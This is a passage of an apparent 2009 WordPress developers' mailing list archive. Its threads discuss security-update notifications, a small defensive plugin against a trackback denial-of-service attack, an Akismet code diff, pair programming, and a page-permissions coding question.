	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>
	<d7153760910191419l26646923pa44a92e06ac789e2@mail.gmail.com>
	<427667db0910191534g2643695dua759cb7c7a24ad36@mail.gmail.com>
Message-ID: <b2c204580910191633y223efeccs75f29b769a046f4d@mail.gmail.com>

> Change the sample data - instead of, "this is a post", provide some
> meaningful information. With a link to subscribe to WP-Announce.
> Make an entry announcing that WP-Announce is being used, so this will show
> in the dashboard feeds. Bloggers will quickly pick up on this and news of
> it
> will spread.
>
>
This is actually a pretty low cost (testing and dev) but high impact (end
user + new admin) idea.

+1

From mccormicky at gmail.com  Mon Oct 19 23:36:05 2009
From: mccormicky at gmail.com (mccormicky)
Date: Mon, 19 Oct 2009 19:36:05 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <427667db0910191534g2643695dua759cb7c7a24ad36@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>
	<d7153760910191419l26646923pa44a92e06ac789e2@mail.gmail.com>
	<427667db0910191534g2643695dua759cb7c7a24ad36@mail.gmail.com>
Message-ID: <d7153760910191636r61c1f9b8n590c1ee5669bd4ca@mail.gmail.com>

> *>Most people have enough
> >clues to check which version they are using* (if they don't already know)
> so
> >a simple notification that a new release is available and whether that
> >release is a security release or not should suffice.
>


yep!




On Mon, Oct 19, 2009 at 6:34 PM, Lynne Pope <lynne.pope at gmail.com> wrote:

> 2009/10/20 mccormicky <mccormicky at gmail.com>
>
> >
> > I also think that not doing something because 25 people will complain
> about
> > it but 200,000 will be helped is not reasonable.
> >
>
> One of the problems faced by all FOSS projects is that developers are
> rarely
> able to identify what constitutes an "average user". Another problem is the
> assumption that if users don't like a feature, they will complain and we
> will all know.
>
> WordPress is downloaded millions of times. If even half of those downloads
> result in a live site, then the discrepancy in numbers between installs and
> people visiting the forums or mailing lists is huge. Many people who have
> complaints over things they don't like don't bother saying anything, they
> just change to another open source app. Kudos or complaints are not a good
> way to judge if a feature is wanted/liked/not causing issues.
>
> When considering the subsets of users, two important groups were
> overlooked:
>
> 1) Users who do an auto install via a server script such as Fantastico.
> These people tend to rely on their auto-installer to help keep them
> up-to-date. Some of these scripts send out an email notification, some
> don't. Since the auto-installers usually have to be licensed by the hosting
> provider these are not always up-to-date and I know of at least one host
> that is still providing WordPress 2.5.1 as a one-click install.
> Apps are often modified by the auto-installers. The user thinks they are
> getting WordPress but what they are really getting is a modified
> distribution of WordPress with no guarantee that update nags are even
> present.
>
> 2) Hosts/ISP's.
> Hosts can be a projects best friend or worst enemy. They don't get to see
> update notices and an email notification from inside a WordPress install is
> not going to help them. If they perceive WordPress to be insecure they
> either ban it from their servers or warn their customers not to use it. Or
> refuse to help if a site is hacked.
> On the other hand, a host that keeps informed about new releases will
> usually send out notices or announce the update on their forums. These may
> be the only forums a user visits.
>
> In my earlier email I suggested adding an opt-in link to the WordPress
> announcements list. When I was thinking more about this I realised that
> having any information on the readme or install screens doesn't help the
> users in 1). Many of the auto-install scripts remove the install screens.
>
> I have read everyone's arguments for an opt-in email in the core, but am
> still firmly convinced that its not the way to go. Most people have enough
> clues to check which version they are using (if they don't already know) so
> a simple notification that a new release is available and whether that
> release is a security release or not should suffice.
>
> The WP-Announce list exists. Everyone can use it, including hosts, to get
> email announcements (assuming the list will ever be used). So, what I
> propose is this:
> Get a commitment from the core team that they will issue announcements on
> that list. And that they will state which upgrades are necessary for
> security.
> Change the sample data - instead of, "this is a post", provide some
> meaningful information. With a link to subscribe to WP-Announce.
> Make an entry announcing that WP-Announce is being used, so this will show
> in the dashboard feeds. Bloggers will quickly pick up on this and news of
> it
> will spread.
>
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chris at clwill.com  Mon Oct 19 23:57:14 2009
From: chris at clwill.com (Chris Williams)
Date: Mon, 19 Oct 2009 16:57:14 -0700
Subject: [wp-hackers] wordpress security
In-Reply-To: <427667db0910191534g2643695dua759cb7c7a24ad36@mail.gmail.com>
Message-ID: <C7024AEA.51B95%chris@clwill.com>

This idea is a home run.

Make the first post be something like: "Congrats on your new WP blog.  Make
sure you keep up-to-date by subscribing to this email list...".  Perhaps
make the first comment also be: "That's a great idea!" :)

Then make sure the WP-Announce mailing list is used very carefully.  Exactly
once for each update, no noise, no beta announcements, just a good clear
release note each time an update comes out.

Perfect solution, Lynne.


> From: Lynne Pope <lynne.pope at gmail.com>
> 
> The WP-Announce list exists. Everyone can use it, including hosts, to get
> email announcements (assuming the list will ever be used). So, what I
> propose is this:
> Get a commitment from the core team that they will issue announcements on
> that list. And that they will state which upgrades are necessary for
> security.
> Change the sample data - instead of, "this is a post", provide some
> meaningful information. With a link to subscribe to WP-Announce.
> Make an entry announcing that WP-Announce is being used, so this will show
> in the dashboard feeds. Bloggers will quickly pick up on this and news of it
> will spread.


From mikeschinkel at newclarity.net  Tue Oct 20 00:08:44 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 19 Oct 2009 20:08:44 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <C7024AEA.51B95%chris@clwill.com>
References: <C7024AEA.51B95%chris@clwill.com>
Message-ID: <3300D553-77C0-4E85-8AEF-8436AB997C69@newclarity.net>

From: Lynne Pope <lynne.pope at gmail.com>
> Change the sample data - instead of, "this is a post", provide some
> meaningful information. With a link to subscribe to WP-Announce.


Awesome idea.  Many thumbs up!  (FYI, that's what Drupal does...)

Suggest providing numerous pointers; i.e. list of themes and list of  
plugins on WordPress.org.  Other suggestions?

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/


From glenn at glennansley.com  Tue Oct 20 14:31:59 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Tue, 20 Oct 2009 10:31:59 -0400
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
Message-ID: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>

Hi All,
There have been several reports this morning of a DOS attack affecting
the WordPress wp-trackback.php file.

    * [original post] http://www.stevefortuna.com/new-0-day-wordpress-exploit/
    * http://jarraltech.com/2009/10/new-0-day-wordpress-exploit/
    * http://www.hashbangcode.com/blog/wordpress-dos-attack-script-solution-2135.html

All the the solutions have been the same thus far and require editing
your .htaccess file or the wp-trackback.php file.

FullThrottle has composed this quick plugin that accomplishes the same
thing as the edit to the wp-trackback.php file.

We will update this post and our code if further insight into the
attack deems it necessary.
We'd greatly appreciate any feedback this list has as well.

You can download the plugin to test here:
http://fullthrottledevelopment.com/wordpress-plugin-to-stop-trackback-dos-attacks

or place the following in your theme's functions.php file:

function ft_stop_trackback_dos_attacks(){
	global $pagenow;
	if ( 'wp-trackback.php' == $pagenow ){
		// DoS attack fix.
		if ( isset($_POST['charset']) ){
			$charset = $_POST['charset'];
			if ( strlen($charset) > 50 ) {  die; }
		}
	}
}
add_action('init','ft_stop_trackback_dos_attacks');

Thanks,
Glenn Ansley
http://fullthrottledevelopment.com

From gaarai at gaarai.com  Tue Oct 20 14:37:17 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Tue, 20 Oct 2009 09:37:17 -0500
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>
Message-ID: <4ADDCB1D.5070707@gaarai.com>

Thanks for the quick work on this Glenn. Looks like we can be expecting
a 2.8.5 soon.

Chris Jean
http://gaarai.com/
@chrisjean



Glenn Ansley wrote:
> Hi All,
> There have been several reports this morning of a DOS attack affecting
> the WordPress wp-trackback.php file.
>
>     * [original post] http://www.stevefortuna.com/new-0-day-wordpress-exploit/
>     * http://jarraltech.com/2009/10/new-0-day-wordpress-exploit/
>     * http://www.hashbangcode.com/blog/wordpress-dos-attack-script-solution-2135.html
>
> All the the solutions have been the same thus far and require editing
> your .htaccess file or the wp-trackback.php file.
>
> FullThrottle has composed this quick plugin that accomplishes the same
> thing as the edit to the wp-trackback.php file.
>
> We will update this post and our code if further insight into the
> attack deems it necessary.
> We'd greatly appreciate any feedback this list has as well.
>
> You can download the plugin to test here:
> http://fullthrottledevelopment.com/wordpress-plugin-to-stop-trackback-dos-attacks
>
> or place the following in your theme's functions.php file:
>
> function ft_stop_trackback_dos_attacks(){
> 	global $pagenow;
> 	if ( 'wp-trackback.php' == $pagenow ){
> 		// DoS attack fix.
> 		if ( isset($_POST['charset']) ){
> 			$charset = $_POST['charset'];
> 			if ( strlen($charset) > 50 ) {  die; }
> 		}
> 	}
> }
> add_action('init','ft_stop_trackback_dos_attacks');
>
> Thanks,
> Glenn Ansley
> http://fullthrottledevelopment.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From navjotjsingh at gmail.com  Tue Oct 20 14:49:57 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Tue, 20 Oct 2009 20:19:57 +0530
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <4ADDCB1D.5070707@gaarai.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com> 
	<4ADDCB1D.5070707@gaarai.com>
Message-ID: <7b9e108c0910200749t1367e62ey11c35b5a380c810a@mail.gmail.com>

Well this should be submitted to the Trac if you want to see it in next WP
version.

On Tue, Oct 20, 2009 at 8:07 PM, Chris Jean <gaarai at gaarai.com> wrote:

> Thanks for the quick work on this Glenn. Looks like we can be expecting
> a 2.8.5 soon.
>
> Chris Jean
> http://gaarai.com/
> @chrisjean
>
>
>
> Glenn Ansley wrote:
> > Hi All,
> > There have been several reports this morning of a DOS attack affecting
> > the WordPress wp-trackback.php file.
> >
> >     * [original post]
> http://www.stevefortuna.com/new-0-day-wordpress-exploit/
> >     * http://jarraltech.com/2009/10/new-0-day-wordpress-exploit/
> >     *
> http://www.hashbangcode.com/blog/wordpress-dos-attack-script-solution-2135.html
> >
> > All the the solutions have been the same thus far and require editing
> > your .htaccess file or the wp-trackback.php file.
> >
> > FullThrottle has composed this quick plugin that accomplishes the same
> > thing as the edit to the wp-trackback.php file.
> >
> > We will update this post and our code if further insight into the
> > attack deems it necessary.
> > We'd greatly appreciate any feedback this list has as well.
> >
> > You can download the plugin to test here:
> >
> http://fullthrottledevelopment.com/wordpress-plugin-to-stop-trackback-dos-attacks
> >
> > or place the following in your theme's functions.php file:
> >
> > function ft_stop_trackback_dos_attacks(){
> >       global $pagenow;
> >       if ( 'wp-trackback.php' == $pagenow ){
> >               // DoS attack fix.
> >               if ( isset($_POST['charset']) ){
> >                       $charset = $_POST['charset'];
> >                       if ( strlen($charset) > 50 ) {  die; }
> >               }
> >       }
> > }
> > add_action('init','ft_stop_trackback_dos_attacks');
> >
> > Thanks,
> > Glenn Ansley
> > http://fullthrottledevelopment.com
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Tue Oct 20 15:01:11 2009
From: scribu at gmail.com (scribu)
Date: Tue, 20 Oct 2009 18:01:11 +0300
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <7b9e108c0910200749t1367e62ey11c35b5a380c810a@mail.gmail.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>
	<4ADDCB1D.5070707@gaarai.com>
	<7b9e108c0910200749t1367e62ey11c35b5a380c810a@mail.gmail.com>
Message-ID: <349fe48b0910200801m40f6b266v12b285bb0d7b6d@mail.gmail.com>

On Tue, Oct 20, 2009 at 5:49 PM, Navjot Singh <navjotjsingh at gmail.com>wrote:

> Well this should be submitted to the Trac if you want to see it in next WP
> version.
>

http://core.trac.wordpress.org/ticket/10980

-- 
http://scribu.net

From dc153464a11bcf5aeb18180db28017fb.wp-hackers at planetmike.com  Tue Oct 20 15:03:04 2009
From: dc153464a11bcf5aeb18180db28017fb.wp-hackers at planetmike.com (Michael Clark)
Date: Tue, 20 Oct 2009 11:03:04 -0400
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <4ADDCB1D.5070707@gaarai.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>
	<4ADDCB1D.5070707@gaarai.com>
Message-ID: <p06240808c7037d801d53@[192.168.1.64]>

If you are using custom permalinks, when is wp-trackback.php ever 
called directly during the trackback process? I just tested this, and 
the only files accessed were

ip.add.re.ss - - [20/Oct/2009:10:43:18 -0400] "HEAD /example-url 
HTTP/1.0" 200 - "-" "WordPress/; http://www.example.com"
ip.add.re.ss - - [20/Oct/2009:10:43:18 -0400] "POST /xmlrpc.php 
HTTP/1.0" 200 297 "-" "The Incutio XML-RPC PHP Library -- WordPress/"
ip.add.re.ss - - [20/Oct/2009:10:43:22 -0400] "HEAD /example-url 
HTTP/1.0" 200 - "-" "WordPress/; http://www.example.com"

It seems to me that anyone ever accessing wp-trackback.php directly 
should be rejected, blocked, and/or firewalled. What am I missing? 
Both blogs tested using WP 2.8.4. My blog headers show /xmlrpc.php 
not wp-trackback.php.

Aah, I see it now. If you aren't using pretty URLs, your trackbacks 
will be url/trackback/ . I use the Trackback Validator from 
http://seclab.cs.rice.edu/proj/trackback/ Will that plugin help 
protect against type of attack? Mike




At 9:37 AM -0500 10/20/09, Chris Jean wrote:
>
>Glenn Ansley wrote:
>>  Hi All,
>>  There have been several reports this morning of a DOS attack affecting
>>  the WordPress wp-trackback.php file.
>>
>  >     * [original post] 
>http://www.stevefortuna.com/new-0-day-wordpress-exploit/
>  >     * 
>http://www.hashbangcode.com/blog/wordpress-dos-attack-script-solution-2135.html
>>
>>  All the the solutions have been the same thus far and require editing
>>  your .htaccess file or the wp-trackback.php file.
>>
>>  FullThrottle has composed this quick plugin that accomplishes the same
>>  thing as the edit to the wp-trackback.php file.
>>
>>  We will update this post and our code if further insight into the
>>  attack deems it necessary.
>>  We'd greatly appreciate any feedback this list has as well.
>>
>>  You can download the plugin to test here:
>> 
>>http://fullthrottledevelopment.com/wordpress-plugin-to-stop-trackback-dos-attacks
>>
>>  or place the following in your theme's functions.php file:
>>
>>  function ft_stop_trackback_dos_attacks(){
>>	global $pagenow;
>>	if ( 'wp-trackback.php' == $pagenow ){
>>		// DoS attack fix.
>>		if ( isset($_POST['charset']) ){
>>			$charset = $_POST['charset'];
>>			if ( strlen($charset) > 50 ) {  die; }
>>		}
>>	}
>>  }
>>  add_action('init','ft_stop_trackback_dos_attacks');
>>
>>  Thanks,
>>  Glenn Ansley
>  > http://fullthrottledevelopment.com



-- 

Michael Clark
http://www.PlanetMike.com

Listen to Christmas music 24 hours a day 7 days a week:
http://www.ChristmasMusic247.com

"Injustice anywhere is a threat to justice everywhere."
  - Martin Luther King Jr.

From lynne.pope at gmail.com  Tue Oct 20 23:59:45 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Wed, 21 Oct 2009 12:59:45 +1300
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <p06240808c7037d801d53@192.168.1.64>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com> 
	<4ADDCB1D.5070707@gaarai.com> <p06240808c7037d801d53@192.168.1.64>
Message-ID: <427667db0910201659n337e6c0coa103557148ac1456@mail.gmail.com>

WordPress 2.8.5: Hardening Release http://j.mp/3gZDRS

This should fix the new 0-day exploit.

Lynne

From tlpstone at gmail.com  Wed Oct 21 05:23:48 2009
From: tlpstone at gmail.com (Taunja Palmer-Stone)
Date: Tue, 20 Oct 2009 23:23:48 -0600
Subject: [wp-hackers] wordpress security
Message-ID: <17ffe4720910202223m2f03787ahd5557db2fd2398af@mail.gmail.com>

I have been watching the discussion about sending an email when a security
update is available with interest. I am neither as savvy as most (any?) of
you on the coding side of things, nor as technically challenged as those who
need to hire someone to set up their blogs (if you're wondering what I'm
doing on the list, I'm watching & learning).

Today I received an email notification that there is a WordPress security
release. After months of (1) missing them and (2) signing up for the mailing
list promising e-mail updates on the WP.org download page, I made my own
from the official feed using FeedBurner. Works like a charm.

I don't blog regularly due to time restrictions and also have two
installations using WordPress more as a CMS (which is becoming a common use
for WordPress), so while the update notice is handy when I do log in, it's
not as helpful to me as it is to those who blog more regularly. The official
mailing list, for whatever reason, has not sent out a single e-mail in all
the time that I've been subscribed to it despite promises of notification
for new stable releases (I could have sworn it used to say 'updates' but
either way I never get anything from that list).

Even though I only had the link up for subscribing to this update-only feed
for a few months on one of my blogs that got very little traffic, I still
got other people signing up for it who found it through Google (I had posted
about my frustration at not getting e-mail updates & my solution).

There is a need for an e-mail notification system, but I agree that doing it
through the installation may not be the best approach. The existing mailing
list on WP.org, if it was used, might be the best solution: (1) voluntary,
(2) one e-mail per user instead of per installation for those with multiple
installations, (3) officially sanctioned, (4) not reliant on the server
being properly configured for email, (5) can't be turned off if the
WordPress installation is compromised.

If the text for the default first post was changed as has been suggested
earlier, information on how to subscribe could be included in that text.
Alternatively there is the heavy-handed approach of forcing people to sign
up before they can download WordPress (I'm not a fan of this method--I much
prefer voluntary).

Just a few thoughts from the sidelines,
Taunja



> ------------------------------
>
> Message: 2
> Date: Mon, 19 Oct 2009 18:11:36 +0100
> From: mrmist <listswphackers at mist.org.uk>
> Subject: Re: [wp-hackers] wordpress security
> To: wp-hackers at lists.automattic.com
> Message-ID: <Aq1KYaBI3J3KFwZ9 at dsl-217-155-35-239.zen.co.uk>
> Content-Type: text/plain;charset=us-ascii;format=flowed
>
> In message
> <f38206c90910190752p6257046bk217941cabb21feed at mail.gmail.com>, Jeremi
> Bergman <jeremib at gmail.com> writes
> >I would agree with this.  As an admin of multiple WP sites, I do not login
> >to each admin panel unless needed to.
> >
> >Would be nice to get an email that said an update was available.
> >
>
> But then as an admin of multiple sites, you do not fit the supposed core
> target for such a feature, that being the average Jo user.
>
> A feature such as email inform might be useful, but it'd have to be
> pretty customisable - e.g. the to address not necessarily being the
> "admin" user - and warn users that the feature is dependant on server
> email config being correct.
>
> I also believe that the points made by others already in this thread,
> such as the aspect of creating reliance on such an email, are pretty
> valid and I could see it creating more support load in the forums than
> it solves.
>
> On balance, I'd say that the demographic that ignore or who are bothered
> by the upgrade nag screen, would ignore or be bothered by an email, and
> that those who fall outside of this demographic would have either
> already upgraded based on the nag screen, or represent a small enough
> set that it's just feature bloat to stick it in core.
> --
> mrmist
>
>

From dc153464a11bcf5aeb18180db28017fb.wp-hackers at planetmike.com  Wed Oct 21 11:12:21 2009
From: dc153464a11bcf5aeb18180db28017fb.wp-hackers at planetmike.com (Michael Clark)
Date: Wed, 21 Oct 2009 07:12:21 -0400
Subject: [wp-hackers] Akismet Plugin Changed?
Message-ID: <p06240802c7049b71217c@[192.168.1.64]>

I am in the process of updating WordPress to 2.8.5 and noticed that 
the akismet.php in the wordpress.tar.gz has changed, but the version 
number is still 2.2.6. Under WP 2.8.4, there are 1,108 lines. In WP 
2.8.5 there are 1,118 lines. A diff shows:

403,409d402
< // filter handler used to return a spam result to pre_comment_approved
< function akismet_result_spam( $approved ) {
< 	// bump the counter here instead of when the filter is added 
to reduce the possibility of overcounting
< 	update_option( 'akismet_spam_count', 
get_option('akismet_spam_count') + 1 );
< 	return 'spam';
< }
<
433,434c426,427
< 		// akismet_spam_count will be incremented later by 
akismet_result_spam()
< 		add_filter('pre_comment_approved', 'akismet_result_spam');
---
>  		add_filter('pre_comment_approved', 
>create_function('$a', 'return \'spam\';'));
>  		update_option( 'akismet_spam_count', 
>get_option('akismet_spam_count') + 1 );
442,445c435,436
<
< 		if ( $post->post_type == 'post' && $diff > 30 && 
get_option( 'akismet_discard_month' ) == 'true' ) {
< 			// akismet_result_spam() won't be called so 
bump the counter here
< 			update_option( 'akismet_spam_count', 
get_option('akismet_spam_count') + 1 );
---
>
>  		if ( $post->post_type == 'post' && $diff > 30 && 
>get_option( 'akismet_discard_month' ) == 'true' )
447d437
< 		}

The MD5 hash of the wp284 is:
e6d80085b5064047b7fb85b19cb9aa78  wp-content/plugins/akismet/akismet.php

And of the "new" version is:
456e43efa8df773bc6ed625f28f2a303  wp-content/plugins/akismet/akismet.php


Should the Akismet version be changed, assuming this is a valid 
update to akismet.php? Mike


-- 

Michael Clark
http://www.PlanetMike.com

Listen to Christmas music 24 hours a day 7 days a week:
http://www.ChristmasMusic247.com

"Injustice anywhere is a threat to justice everywhere."
  - Martin Luther King Jr.

From zamoose at gmail.com  Wed Oct 21 12:08:52 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 21 Oct 2009 08:08:52 -0400
Subject: [wp-hackers] Distributed Pairprogramming for Wordpress
	development?
In-Reply-To: <4ADC7252.307@fu-berlin.de>
References: <4AD5C8A7.9030701@fu-berlin.de>
	<161617690910140810n688a2af5k8b4ac00d7703569b@mail.gmail.com> 
	<4ADC7252.307@fu-berlin.de>
Message-ID: <71ddd7490910210508y59ba9d33v1d2da6005ee0fdf4@mail.gmail.com>

On Mon, Oct 19, 2009 at 10:06 AM, Eike Starkmann <
eike.starkmann at fu-berlin.de> wrote:

>
> Perhaps you made some bad experiences, with pair programming and it is
> good that you share it, but there are a lot of people who have made
> different experiences and find it very useful.
>
>
Which is all well and good, if the point of the exercise is training up
newcomers.  However, if the intent is to produce clean, bug-free code in a
fast and efficient manner, what Otto pointed out is true in many/most
situations: you're going to handcuff a gifted programmer and produce worse
code, slower.

It's fine and dandy to do pair programming if you want to initiate knowledge
transfer (what we used to call "teaching"), but as I said, it's not exactly
the best when it comes to clean code, quickly developed.

-- 
-Doug
http://literalbarrage.org/blog/

From otto at ottodestruct.com  Wed Oct 21 13:53:34 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 08:53:34 -0500
Subject: [wp-hackers] Akismet Plugin Changed?
In-Reply-To: <p06240802c7049b71217c@192.168.1.64>
References: <p06240802c7049b71217c@192.168.1.64>
Message-ID: <161617690910210653k6b9f42aam43e62ee5058bf6e6@mail.gmail.com>

I believe that the release version of WordPress is connected to the
trunk version of Akismet. So whenever WordPress gets a new release
built, the latest version of Akismet is included, whether the version
number gets bumped or not.

The log for Akismet [1] shows that there's only been 3 or 4 changes in
the last 3 months. Probably not serious enough changes to warrant
releasing a new version number yet.

1. http://plugins.trac.wordpress.org/log/akismet/trunk

-Otto



On Wed, Oct 21, 2009 at 6:12 AM, Michael Clark
<dc153464a11bcf5aeb18180db28017fb.wp-hackers at planetmike.com> wrote:
> I am in the process of updating WordPress to 2.8.5 and noticed that the
> akismet.php in the wordpress.tar.gz has changed, but the version number is
> still 2.2.6. Under WP 2.8.4, there are 1,108 lines. In WP 2.8.5 there are
> 1,118 lines. A diff shows:
>
> 403,409d402
> < // filter handler used to return a spam result to pre_comment_approved
> < function akismet_result_spam( $approved ) {
> < ? ? ? // bump the counter here instead of when the filter is added to
> reduce the possibility of overcounting
> < ? ? ? update_option( 'akismet_spam_count',
> get_option('akismet_spam_count') + 1 );
> < ? ? ? return 'spam';
> < }
> <
> 433,434c426,427
> < ? ? ? ? ? ? ? // akismet_spam_count will be incremented later by
> akismet_result_spam()
> < ? ? ? ? ? ? ? add_filter('pre_comment_approved', 'akismet_result_spam');
> ---
>>
>> ? ? ? ? ? ? ? ?add_filter('pre_comment_approved', create_function('$a',
>> 'return \'spam\';'));
>> ? ? ? ? ? ? ? ?update_option( 'akismet_spam_count',
>> get_option('akismet_spam_count') + 1 );
>
> 442,445c435,436
> <
> < ? ? ? ? ? ? ? if ( $post->post_type == 'post' && $diff > 30 && get_option(
> 'akismet_discard_month' ) == 'true' ) {
> < ? ? ? ? ? ? ? ? ? ? ? // akismet_result_spam() won't be called so bump the
> counter here
> < ? ? ? ? ? ? ? ? ? ? ? update_option( 'akismet_spam_count',
> get_option('akismet_spam_count') + 1 );
> ---
>>
>> ? ? ? ? ? ? ? ?if ( $post->post_type == 'post' && $diff > 30 &&
>> get_option( 'akismet_discard_month' ) == 'true' )
>
> 447d437
> < ? ? ? ? ? ? ? }
>
> The MD5 hash of the wp284 is:
> e6d80085b5064047b7fb85b19cb9aa78 ?wp-content/plugins/akismet/akismet.php
>
> And of the "new" version is:
> 456e43efa8df773bc6ed625f28f2a303 ?wp-content/plugins/akismet/akismet.php
>
>
> Should the Akismet version be changed, assuming this is a valid update to
> akismet.php? Mike
>
>
> --
>
> Michael Clark
> http://www.PlanetMike.com
>
> Listen to Christmas music 24 hours a day 7 days a week:
> http://www.ChristmasMusic247.com
>
> "Injustice anywhere is a threat to justice everywhere."
> ?- Martin Luther King Jr.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Wed Oct 21 14:03:53 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 09:03:53 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com> 
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com> 
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com> 
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com> 
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com> 
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com> 
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
Message-ID: <161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>

On Mon, Oct 19, 2009 at 3:24 PM, Jeremy Clarke <jer at simianuprising.com> wrote:
> I'll point out that I, as well as a number of other people in this
> thread, have specifically stated that we ourselves would profit from
> this, so it's not an idealized notion, its a group of people who you
> just claimed don't exist while in conversation with them.

People on this list know about the mail notification plugin, and, I
presume, are smart enough to install it. They do not fit into the
categories that I described.

The question is not "what people need mail notification?". The
question is "why have it in core when it's in a plugin?". Somebody who
administers many sites is surely capable of finding a plugin and
installing the thing on those many sites.

> Okay so you
>
> a) dealt with people on the forums who noticed their blogs were hacked

Correction: Not only on the forums. I get around.

> b) noticed that they were all people who had seen the message.

Everybody I asked said that they had ignored it because of some reason
or another. The implication is that the message was seen, yes.

> Concluding that all the people who's blogs were hacked had seen the
> message from this is wrong. Many sites were and are silently hacked
> without the admin ever knowing about it.

A site that the admin has not visited in 2 months is, IMO, a dead
site. No new content, no readers, nobody caring for it...

Note that the yellow box displays to everybody registered on the site.
Not just admins. For those who are not admins, it tells them to alert
the admin to upgrade.

> I don't know the full details
> but if the recent wave of attacks was really a 'worm' then these
> abandoned blogs are a huge part of the problem.

It was not a "worm". People use these terms badly. It was a
straightforward automated hack script. Possibly run by a botnet,
though I doubt it.

-Otto
Sent from Memphis, TN, United States

From steve at sltaylor.co.uk  Wed Oct 21 14:17:36 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Wed, 21 Oct 2009 15:17:36 +0100
Subject: [wp-hackers] get_post_ancestors() inside a custom function
Message-ID: <a21f8bf00910210717j248ad29dq360d1a1437de3d56@mail.gmail.com>

I'm trying to use get_post_ancestors() to implement some extra
permissions checking, basically to restrict editing and deleting of
particular "sections". To briefly explain the function given below:

- For testing, I'm hard-coded the ID of the page that is the parent of
this "section" of the site (it's 12)
- I'm using Justin Tadlock's new Members plugin for managing
capabilities, and 'manage_conference_deff' is a particular capability
I've added that is needed to manage pages in this section.

Viewing the Edit Pages list as a user without the right capability
hides the Edit and Delete links for the main parent page, but not for
any descendants. It seems that get_post_ancestors( $postID ) is
returning an empty array. I can't understand why it's not working -
$postID is definitely coming through OK from $args[0]. Is there any
reason that get_post_ancestors() wouldn't work inside a custom
function?

function slt_map_meta_cap( $caps, $cap, $user_id, $args ) {
	$postID = $args[0];
	switch ( $cap ) {
		case "edit_page":
		case "delete_page": {
			$ancestors = get_post_ancestors( $postID );
			if ( $postID == 12 || in_array( 12, $ancestors ) )
				$caps[] = 'manage_conference_deff';
			break;
		}
	}
	return $caps;
}
add_filter( 'map_meta_cap', 'slt_map_meta_cap', 10, 4 );

thanks,

Steve

From otto at ottodestruct.com  Wed Oct 21 14:41:12 2009
From: otto at ottodestruct.com (Otto)
